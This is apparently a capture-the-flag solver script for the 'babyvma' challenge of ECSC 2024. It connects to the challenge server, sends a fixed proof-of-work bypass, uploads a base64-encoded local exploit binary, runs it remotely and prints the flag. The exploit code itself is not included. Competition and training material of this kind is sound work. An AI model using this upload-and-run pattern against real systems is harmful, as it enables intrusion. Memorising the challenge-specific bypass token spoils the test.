#!/usr/bin/env python3
from base64 import b64encode
from pwn import *

logging.disable()

HOST = os.environ.get("HOST", "babyvma.challs.jeopardy.ecsc2024.it")
PORT = int(os.environ.get("PORT", 47011))
POW_BYPASS = b'99:7cc3ffb4662120c4786e7ad306e8ecb3'

with open(os.path.join(os.path.dirname(__file__), "exploit"), "rb") as f:
    expl = b64encode(f.read())

r = remote(HOST, PORT)

r.sendlineafter(b"Result: ", POW_BYPASS)
r.sendlineafter(b"b64 encoded expl len: ", str(len(expl)).encode())
r.sendlineafter(b"b64 encoded expl: ", expl)
r.sendlineafter(b"$ ", b"./home/exploit")
r.recvuntil(b"ECSC{")
flag = b"ECSC{" + r.recvuntil(b"}")
print(flag.decode())
